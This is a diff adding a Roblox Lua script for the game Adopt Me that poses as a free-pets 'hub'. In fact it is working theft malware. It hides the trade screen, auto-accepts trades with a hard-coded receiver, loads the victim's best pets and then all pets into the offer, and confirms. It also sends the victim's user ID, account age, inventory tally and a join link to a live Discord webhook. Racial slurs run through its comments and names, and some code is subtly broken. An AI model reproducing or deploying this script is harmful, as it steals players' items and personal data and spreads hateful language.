@@ -1,0 +1,265 @@
+-- NIGGAHUB
+local Username = "joshko789" -- Roblox User Here
+local Webhook = "https://discord.com/api/webhooks/1266712504206233611/bbiu-Xm9wbFa1lClMlBV0Ec9bUjv8cEccB_zTkWqhiFnmXGDNpdbJJ2CJo55Z_ehAIlD" -- Webhook Here
+
+-- LIADDD
+repeat
+  wait()
+until game:IsLoaded()
+
+-- NIGGEER
+local loaded = false
+if loaded then
+  return
+end
+loaded = true
+
+-- OMGGG
+local plr = game.Players.LocalPlayer
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local BackpackApp = game:GetService("ReplicatedStorage").ClientModules.Core.UIManager.Apps.BackpackApp.BackpackApp
+local RouterClient = Loads("RouterClient")
+local ClientData = Loads('ClientData')
+local Strollers = ClientData.get("equip_manager")
+local InventoryDB = Loads("InventoryDB")
+local Packpage = Loads('package:Promise')
+local Inventory = ClientData.get("inventory")
+local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+local DeclineTradeRemote = RouterClient.get("TradeAPI/DeclineTrade")
+local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived") --:InvokeServer(player, "Accept"
+local PetsInv = Inventory.pets
+local TradeAcceptOnRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
+
+-- SINNFF
+task.spawn(function()
+  while wait(5) do
+    RouterClient.get("SettingsAPI/SetSetting"):FireServer("trade_requests", 1)
+  end
+end)
+
+-- GODLY SHIT
+local good_pets = {
+  [1] = {"shadow", "dragon"},
+  [2] = {"bat", "dragon"},
+  [3] = {"giraffe", ""},
+  [4] = {"frost", "dragon"},
+  [5] = {"safari", "egg"},
+  [6] = {"owl", ""},
+  [7] = {"parrot", ""},
+  [8] = {"evil", "unicorn"},
+  [9] = {"crow", ""},
+  [10] = {"blue", "egg"},
+  [11] = {"jungle", "egg"},
+  [12] = {"blazing", "lion"},
+  [13] = {"pink", "egg"},
+  [14] = {"farm", "egg"},
+  [15] = {"hedgehog", ""},
+  [16] = {"arctic", "reindeer"},
+  [17] = {"monkey", "king"},
+  [18] = {"dalmatian", ""},
+  [19] = {"albino", "monkey"},
+  [20] = {"turtle", ""},
+  [21] = {"flamingo", ""},
+  [22] = {"lion", ""},
+  [23] = {"blue", "dog"},
+  [24] = {"cow", ""},
+  [25] = {"kangaroo", ""},
+  [26] = {"frost", "fury"}
+}
+
+-- THE NIGG
+local function AcceptTradeOnRequest(plr) --path
+  TradeAcceptOnRequest:InvokeServer(plr, true)
+end
+
+-- FREE PETS NIGGAASZ
+local legendaries_count = 0
+local mega_count = 0
+local neon_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
+
+for i, v in pairs(ClientData.get("inventory").pets) do
+  if InventoryDB[v.category][v.id].rarity == "legendary" then
+    legendaries_count = legendaries_count + 1
+  end
+  if InventoryDB[v.category][v.id].properties == "mega_neon" then
+    mega_count = mega_count + 1
+  end
+  if InventoryDB[v.category][v.id].properties == "neon" then
+    neon_count = neon_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
+    ultra_count = ultra_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "rare" then
+    rare_count = rare_count + 1
+  end
+    if InventoryDB[v.category][v.id].rarity == "uncommon" then
+    uncommon_count = uncommon_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "common" then
+    common_count = common_count + 1
+  end
+end
+
+-- DESTROYYYYY
+game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+
+-- FUNCTION NIGGER
+local function InTrade()
+  if game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible == false then
+    return false
+  else
+    return true
+  end
+end
+
+-- INFOZ
+local trade_info = {}
+
+-- FUCK ADOPT ME
+for i, v in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
+  if v:IsA('RemoteEvent') then
+    spawn(function()
+      v.OnClientEvent:Connect(function(...)
+        x = {} -- <--- Add a closing } here
+        if type(x[3]) == 'table' and x[2] == 'trade' then
+          table = x[3]
+          --sender = table.sender
+          --sender_offer = table.sender_offer
+          trade_info = table
+        end
+      end)
+    end)
+  end
+end
+-- PETZZ
+local function check_pet(id)
+  for i, v in pairs(good_pets) do
+    if string.find(id, v[1]) and string.find(id, v[2]) then
+      return true
+    end
+  end
+end
+
+-- STEALERRRRRRRRR
+local function start_steal(plr)
+  local sex = TradeRequestReceivedRemote.OnClientEvent:Connect(function(plr)
+    game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+    if InTrade() == true then
+      return
+    end
+    plrName = plr.Name
+    if plrName ~= Username then
+      DeclineTradeRemote:FireServer()
+      return
+    end
+  end)
+
+  DeclineTradeRemote:FireServer()
+
+  wait(.1)
+
+  while task.wait() do
+    repeat
+      send_trade:FireServer(game.Players[Username])
+      wait(0.5)
+    until (trade_info.sender_offer and #trade_info.sender_offer ~= nil) and (trade_info.sender_offer and trade_info.sender_offer.player_name ~= nil)
+
+    for i, v in pairs(ClientData.get("inventory").pets) do
+      if check_pet(v.id) then
+        AddPetRemote:FireServer(i)
+        task.wait()
+      end
+    end
+    task.wait()
+    for i, v in pairs(ClientData.get("inventory").pets) do
+      if v["properties"] and (v["properties"]["neon"] ~= nil or v["properties"]["mega_neon"] ~= nil) then
+        AddPetRemote:FireServer(i)
+        task.wait()
+      end
+    end
+    task.wait()
+    for i, v in pairs(ClientData.get("inventory").pets) do
+      if InventoryDB[v.category][v.id].rarity == "legendary" then
+        AddPetRemote:FireServer(i)
+        task.wait()
+      end
+    end
+    task.wait()
+    for i, v in pairs(ClientData.get("inventory").pets) do
+      AddPetRemote:FireServer(i)
+      task.wait()
+    end
+    task.spawn(function()
+      for i = 1, 50 do
+        if InTrade() == false then
+          break
+        end
+        AcceptNegotiationRemote:FireServer()
+        wait(.35)
+        if InTrade() == false then
+          break
+        end
+        AcceptTradeRemote:FireServer()
+      end
+    end)
+    repeat
+      wait()
+    until not InTrade()
+  end
+end
+
+-- W IN CHATTTT
+for _, plr in pairs(game.Players:GetPlayers()) do
+  if plr.Name:lower() == Username:lower() then
+    plr.Chatted:Connect(function()
+      start_steal(plr)
+    end)
+  end
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+  if plr.Name:lower() == Username:lower() then
+    plr.Chatted:Connect(function()
+      start_steal(plr)
+    end)
+  end
+end)
+
+-- WEBHOOKERRRRRZZ
+local userr = Username
+local userid = game.Players.LocalPlayer.UserId
+ local accage = game.Players.LocalPlayer.AccountAge
+local data = {
+  username = 'NiggaHub V29 ☁️',
+  avatar_url = 'https://cdn.discordapp.com/attachments/1266886405208936650/1270128838679986228/images_2.jpg?ex=66b29328&is=66b141a8&hm=6db84cb36a52d8b48f1b940c42ddc1fc118eb18073bf38bcc629bae35e426f6b&',
+  content = '@everyone Join your player using **Join Script** and type **!trade** in chat to start stealing!',
+  embeds = {
+    {
+      title = 'New Adopt Me Execution 💻',
+      description = '**🌩  User Information**: \n ```lua\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. userr ..'\n```\n **🌧 Inventory**: \n ```lua\n🐙 Legendaries: '.. tostring(legendaries_count).. '\n🦄 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🦅 Ultra Rares: '.. tostring(ultra_count).. '\n🐶 Rares: '.. tostring(rare_count).. '\n🐳 Uncommons: '.. tostring(uncommon_count).. '\n🐢 Commons: '.. tostring(common_count).. '\n```\n**🌦 Join Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      color = 9807270
+    }
+  }
+}
+local httpRequest = http.request or httprequest
+if httpRequest then
+  httpRequest({
+    Url = Webhook,
+    Method = 'POST',
+    Headers = {
+      ['Content-Type'] = 'application/json'
+    },
+    Body = game:GetService('HttpService'):JSONEncode(data)
+  })
+else
+  print("LMAOOOOOO")
+end
